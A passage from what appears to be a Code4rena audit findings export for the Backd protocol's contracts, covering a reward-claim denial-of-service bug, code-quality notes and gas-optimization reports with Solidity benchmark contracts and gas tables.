https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L151-L164   # Vulnerability details  ## Impact In the **_calcTotalClaimable()** function it should be validated that perPeriodTotalFees[i] != 0 since otherwise it would generate a DoS in **claimableRewards()** and **claimRewards()**. This would be possible since if **advanceEpoch()** or **kill()** is executed by the InflationManager address, the epoch will go up without perPeriodTotalFees[newIndexEpoch] is 0. The negative of this is that every time the **InflationManager** executes these two methods (**kill() and advanceEpoch()**) DoS is generated until you run **reportFees()**. Another possible case is that **kill()** or **advanceEpoch()** are executed 2 times in a row and there is no way of a perPeriodTotalFees[epoch-1] updating its value, therefore it would be an irreversible DoS.  ## Recommended Mitigation Steps Generate a behavior for the case that perPeriodTotalFees[i] == 0.   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/34", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": " **AddressProvider.sol** - L93/117 - It is validated that pool != address(0) but actually pool is needed to put it inside the ILiquidityPool interface, therefore, the best thing would be to request the interface directly in the signature, like this: addPool(ILiquidityPool pool) and removePool(ILiquidityPool pool). In this way, it would be avoided to validate that pool != address(0), since address(0) does not comply with the ILiquidityPool interface.  - L288 - An address is requested in the addStakerVault() function and as soon as the function starts it is put inside the IStakerVault interface, therefore, the best would be to request the interface directly in the signature, like this: addStakerVault(IStakerVault stakerVault). This way it would avoid starting to execute inside the function.  **Controller.sol** - L33 - The setInflationManager() function performs two validations, the second would not be necessary if an IInflationManager is requested directly in the signature (as is done in the constructor). This would also have the benefit of not being wrapear on line 36.  - L39 - The addStakerVault() function has as its first validation, return false if this validation is true (!addressProvider.addStakerVault(stakerVault)), The problem with this validation is that in the implementation of AddressProvider it never returns false, therefore the validation is not necessary (it is also immutable, therefore it can only be modified in the deploy).  - L121/123/127/129 - The code of the function getTotalEthRequiredForGas() would be much cleaner if the signature contains the creation of the variable (returns (uint256 totalEthRequired)), in this way the creation of the variable in line 123 and the final return would be avoided.  **contracts/zaps/PoolMigrationZap.sol** - L24/25 - If when executing: newPool_.getUnderlying(), we get address(0) as response, it should not be correct to set _underlyingNewPools[address(0)] and this is currently happening. The validation of line 26: if (underlying_ == address(0)) continue; it should be earlier.  **contracts/BkdLocker.sol** - L188 - It is not validated in the getShareOfTotalBoostedBalance() function that when the division is performed with totalLockedBoosted, totalLockedBoosted is != 0.  **contracts/tokenomics/FeeBurner.sol** - L25 - The WETH address is hardcoded, this implies that this code is only usable in a single network. If it's on testnet, it can't be deployed on mainnet. If it's on mainnet, you can't test it.  - L79 - When the targetUnderlying_ variable is created, it is never validated that it is != address(0), this is important, since otherwise when swapAll() is executed they would be burning WETH.   **contracts/tokenomics/KeeperGauge.sol** - L77 - The function requests an extra variable that is not requested. There is a comment that says to add it so that the compiler don't throw warnings.  **contracts/StakerVault.sol** - L156/157 - First it should be validated that the src has an amount to transfer and then check if it needs allowance or not.  - L185 - If a malicious address is approved and if the src wants to change the approve it has, the spender could front run it to spend that approve you have and end up with more allowance.  **contracts/tokenomics/InflationManager.sol** - L80/81 - In the mint() function of the minter contract it can only be executed by the deployer of the BkdToken contract. Therefore, there is not much benefit in mintRewards() being executed for any address that returns true in the modifieronlyGauge(). "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/32", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "**RoleManager.sol** - L27/46/112/113 - The modifier generates a lot of gas cost, it would be less expensive to use an if with a custom error or a private view function.  **AddressProvider.sol** - L64/71/98/102/176/185/199/241/242/260/270/295/296/325/428/434 - The require are too expensive, it would be saved using the Errors custom + if, instead of requires. Another option could be to use a private view function.  - L101/102/103/118/119/121/122/123 - The get calls to other contracts, being a view method, do not generate any cost, therefore, it would be less expensive not to create variables and call the getter directly.  **Controller.sol** - L49/50/51/66/69/71 - The get calls to other contracts, being a view method, do not generate any cost, therefore, it would be less expensive not to create variables and call the getter directly.  - L66 - A variable is created and gas is consumed to fill a variable that will only be used if the if in line 68 is true, since it is only used within the if, it should be created within the if.  **BkdToken.sol** - L31 - Gas can be saved if instead of a require an if is used, with the custom error already created.  **libraries/UncheckedMath.sol** - L7 - In the uncheckedInc() function, the gas could be further optimized, if instead of unchecked{a+1;} it was unchecked {++a;}  **contracts/RewardHandler.sol** - L63 - It is less expensive to validate that variable != 0, than to validate variable > 0.  **contracts/BkdLocker.sol** - L91/92/137/139/254/301 - It is less expensive to validate that variable != 0, than to validate variable > 0.  - L91/92/119/137/208 - Gas can be saved if instead of a require an if is used, with the custom error already created.  - L140/144 - --i is less expensive than i = i - 1;  - 150/151 - A newTotal variable is created, to only be used in one place, it is not necessary and gas could be saved by not doing it.  **contracts/tokenomics/FeeBurner.sol** - L117 - It is less expensive to validate that variable != 0, than to validate variable > 0.  **contracts/tokenomics/LpGauge.sol** - L59 - The if that validates: (amount <= 0) does not make much sense, since in uint there is no < 0, therefore the correct validation is: (amount == 0).  - L68/114 - The if that validates param > 0, could become less expensive if instead of >, a != is used.  - L111/115 - A currentRate variable is created, which is only used in one place, therefore it is not necessary and more gas is spent.  **contracts/tokenomics/VestedEscrowRevocable.sol** - L101 - The claim() function appears as nonReentrant, but there is no reason for reentrant to occur, since only a transferFrom is performed on line 146 at VestedEscrow.sol  - L97/98 - It is not necessary to create a variable that will only be used once, it would save gas if it is used directly.  - L103/104 - It is possible to create a variable in memory for revokedTime[msg.sender], in this way less gas would be used.  - L52/53/54 - The modifier generates a lot of gas cost, it would be less expensive to use an if with a custom error or a private view function.  - L54 - In the revoke() function the storage treasury address is used multiple times, one way to save gas is to create a variable in memory.  **contracts/tokenomics/VestedEscrow.sol** - L83/84 - It is not necessary to create a variable that will only be used once, it would save gas if it is used directly. Gas is also saved if instead of > 0 we use != 0.  - L89 - It is not necessary for the function to be nonReentrant, since the transfers that occur are only in the rewardToken address that is set by the owner on deploy, so there shouldn't be a problem with reentry.   - L134/135/155/156/168/169 - It is not necessary to create a variable that will only be used once, it would save gas if it is used directly.  **contracts/utils/Preparable.sol** - L28/29/86/98/110/111 - The modifier generates a lot of gas cost, it would be less expensive to use an if with a custom error or a private view function.  **contracts/tokenomics/KeeperGauge.sol** - L59/98 - ++epoch uses less gas than epoch++;  - L39/78/82/126/140 - The requirements are very expensive, it could save gas if instead of a modifier it is an if with a custom error or a private view function.  - L140 - Gas is saved, if instead of totalClaimable > 0 you can use totalClaimable != 0.  **contracts/tokenomics/AmmGauge.sol** - L63 - It should be amount == 0, it doesn't make sense for amount to be <= 0, since it is uint256.  - L88/104/125/147 - Gas would be saved if instead of variable > 0 variable != 0 is used.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/27", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Gas Optimizations  The following sections detail the gas optimizations found throughout the codebase. Each optimization is documented with the setup, an explainer for the optimization, a gas report and line identifiers for each optimization across the codebase. For each section's gas report, the optimizer was turned on and set to 10000 runs. You can replicate any tests/gas reports by heading to [0xKitsune/gas-lab](https://github.com/0xKitsune/gas-lab) and cloning the repo. Then, simply copy/paste the contract examples from any section and run `forge test --gas-report`. You can also easily update the optimizer runs in the `foundry.toml`.  ---  ## Use assembly to hash instead of Solidity  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public view {         c0.solidityHash(2309349, 2304923409);         c1.assemblyHash(2309349, 2304923409);     } }  contract Contract0 {     function solidityHash(uint256 a, uint256 b) public view {         //unoptimized         keccak256(abi.encodePacked(a, b));     } }  contract Contract1 {     function assemblyHash(uint256 a, uint256 b) public view {         //optimized         assembly {             mstore(0x00, a)             mstore(0x20, b)             let hashedVal := keccak256(0x00, 0x40)         }     } } ```  ### Gas Report  ```js \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract0 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 36687              \u2506 214             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 solidityHash       \u2506 313             \u2506 313 \u2506 313    \u2506 313 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract1 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 31281              \u2506 186             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 assemblyHash       \u2506 231             \u2506 231 \u2506 231    \u2506 231 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f ```  ### Lines  - InflationManager.sol:628  - InflationManager.sol:632  - InflationManager.sol:636  ---  ## `unchecked{++i}` instead of `i++` (or use assembly when applicable)  Use `++i` instead of `i++`. This is especially useful in for loops but this optimization can be used anywhere in your code. You can also use `unchecked{++i;}` for even more gas savings but this will not check to see if `i` overflows. For extra safety if you are worried about this, you can add a require statement after the loop checking if `i` is equal to the final incremented value. For best gas savings, use inline assembly, however this limits the functionality you can achieve. For example you cant use Solidity syntax to internally call your own contract within an assembly block and external calls must be done with the `call()` or `delegatecall()` instruction. However when applicable, inline assembly will save much more gas.  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;     Contract4 c4;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();         c4 = new Contract4();     }      function testGas() public {         c0.iPlusPlus();         c1.plusPlusI();         c2.uncheckedPlusPlusI();         c3.safeUncheckedPlusPlusI();         c4.inlineAssemblyLoop();     } }  contract Contract0 {     //loop with i++     function iPlusPlus() public pure {         uint256 j = 0;         for (uint256 i; i < 10; i++) {             j++;         }     } }  contract Contract1 {     //loop with ++i     function plusPlusI() public pure {         uint256 j = 0;         for (uint256 i; i < 10; ++i) {             j++;         }     } }  contract Contract2 {     //loop with unchecked{++i}     function uncheckedPlusPlusI() public pure {         uint256 j = 0;         for (uint256 i; i < 10; ) {             j++;              unchecked {                 ++i;             }         }     } }  contract Contract3 {     //loop with unchecked{++i} with additional overflow check     function safeUncheckedPlusPlusI() public pure {         uint256 j = 0;         uint256 i = 0;         for (i; i < 10; ) {             j++;              unchecked {                 ++i;             }         }          //check for overflow         assembly {             if lt(i, 10) {                 mstore(0x00, \"loop overflow\")                 revert(0x00, 0x20)             }         }     } }  contract Contract4 {     //loop with inline assembly     function inlineAssemblyLoop() public pure {         assembly {             let j := 0              for {                 let i := 0             } lt(i, 10) {                 i := add(i, 0x01)             } {                 j := add(j, 0x01)             }         }     } }  ```  ### Gas Report  ```js  \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract0 contract \u2506                 \u2506      \u2506        \u2506      \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 37687              \u2506 219             \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg  \u2506 median \u2506 max  \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 iPlusPlus          \u2506 2039            \u2506 2039 \u2506 2039   \u2506 2039 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract1 contract \u2506                 \u2506      \u2506        \u2506      \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 37287              \u2506 217             \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg  \u2506 median \u2506 max  \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 plusPlusI          \u2506 1989            \u2506 1989 \u2506 1989   \u2506 1989 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract3 contract     \u2506                 \u2506      \u2506        \u2506      \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost        \u2506 Deployment Size \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 42693                  \u2506 244             \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name          \u2506 min             \u2506 avg  \u2506 median \u2506 max  \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 safeUncheckedPlusPlusI \u2506 1355            \u2506 1355 \u2506 1355   \u2506 1355 \u2506 1       \u2502 